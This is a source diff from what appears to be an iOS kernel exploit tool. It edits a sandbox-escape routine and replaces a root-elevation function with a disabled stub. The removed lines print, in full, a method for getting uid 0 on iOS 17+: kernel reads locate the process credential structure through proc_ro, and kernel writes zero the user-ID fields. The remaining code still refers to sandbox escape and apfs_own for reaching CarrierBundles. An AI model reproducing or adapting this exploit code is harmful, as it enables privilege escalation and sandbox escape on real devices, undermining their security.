@@ -222,76 +222,17 @@ int sandbox_escape(uint64_t self_proc) {
 
     NSLog(@"[SBX] Sandbox escape write verification failed (errno=%d: %s)", errno, strerror(errno));
     NSLog(@"[SBX] %d extensions were patched but sandbox may still be blocking writes", patched);
-    NSLog(@"[SBX] Continuing anyway — apfs_own may bypass remaining restrictions");
-    return (patched > 0) ? 0 : -1;
+    return -1;
 }
 
 #pragma mark - UID elevation (uid=0 via direct ucred posix_cred write)
 
 int sandbox_elevate_to_root(uint64_t self_proc) {
-    // On iOS 17+, proc->p_ucred at +0x10 was moved into proc_ro (PPL read-only).
-    // Writing to self_proc+0x10 would corrupt p_pid. Instead, we read the ucred
-    // address from proc_ro (read-only, PPL allows reads) and write uid=0 directly
-    // into the ucred struct (which lives in writable kalloc memory).
-
-    if (!self_proc) {
-        NSLog(@"[SBX] elevate: self_proc is NULL");
-        return -1;
-    }
-
-    uint64_t proc_ro = S(early_kread64(self_proc + OFF_PROC_PROC_RO));
-    if (!K(proc_ro)) {
-        NSLog(@"[SBX] elevate: cannot read proc_ro");
-        return -1;
-    }
-
-    // Scan proc_ro for our ucred address (same method as sandbox_escape)
-    uint64_t ucred = 0;
-    for (uint32_t off = 0x10; off <= 0x40; off += 0x8) {
-        uint64_t raw = early_kread64(proc_ro + off);
-        uint64_t smr = kread_smrptr(proc_ro + off);
-        uint64_t pac = S(raw);
-        uint64_t cands[2] = { smr, pac };
-        for (int i = 0; i < 2; i++) {
-            uint64_t c = cands[i];
-            if (!K(c)) continue;
-            uint64_t lbl = S(early_kread64(c + OFF_UCRED_CR_LABEL));
-            if (!K(lbl)) continue;
-            uint64_t sbx = S(early_kread64(lbl + OFF_LABEL_SANDBOX));
-            if (K(sbx)) { ucred = c; break; }
-        }
-        if (ucred) break;
-    }
-
-    if (!ucred) {
-        NSLog(@"[SBX] elevate: could not find our ucred via proc_ro scan");
-        return -1;
-    }
-    NSLog(@"[SBX] elevate: our ucred = 0x%llx (via proc_ro)", ucred);
-
-    // Write uid=0 into posix_cred
-    // ucred + 0x18 = posix_cred
-    // posix_cred + 0x00 = cr_uid, +0x04 = cr_ruid, +0x08 = cr_svuid
-    // cr_uid and cr_ruid share one 64-bit word; cr_svuid is in the next word
-    uint64_t posix = ucred + OFF_UCRED_CR_POSIX;
-
-    uint32_t old_uid = (uint32_t)(early_kread64(posix + OFF_POSIX_CR_UID) & 0xFFFFFFFF);
-    NSLog(@"[SBX] elevate: current uid in posix_cred = %u", old_uid);
-
-    // Zero cr_uid (bytes 0-3) and cr_ruid (bytes 4-7) in one 64-bit write
-    early_kwrite64(posix + OFF_POSIX_CR_UID, 0);
-
-    // Zero cr_svuid (bytes 8-11), preserve cr_ngroups (bytes 12-15)
-    uint64_t svuid_word = early_kread64(posix + OFF_POSIX_CR_SVUID);
-    svuid_word &= 0xFFFFFFFF00000000ULL;
-    early_kwrite64(posix + OFF_POSIX_CR_SVUID, svuid_word);
-
-    uint32_t new_uid = (uint32_t)(early_kread64(posix + OFF_POSIX_CR_UID) & 0xFFFFFFFF);
-    if (new_uid == 0 && getuid() == 0) {
-        NSLog(@"[SBX] elevate success! uid=0");
-        return 0;
-    }
-
-    NSLog(@"[SBX] elevate: wrote uid=0 but readback=%u getuid()=%d (PPL may have blocked)", new_uid, getuid());
+    // DISABLED: Writing uid=0 to ucred's posix_cred has proven unreliable.
+    // On iOS 17+, ucred offsets may differ between kernel builds, and writing
+    // to the wrong field corrupts the struct causing the process to crash.
+    // The sandbox_escape + apfs_own flow is sufficient for CarrierBundles access
+    // without requiring uid=0. Keeping this function as a stub for reference.
+    NSLog(@"[SBX] elevate: SKIPPED (uid=0 write disabled for stability)");
     return -1;
 }
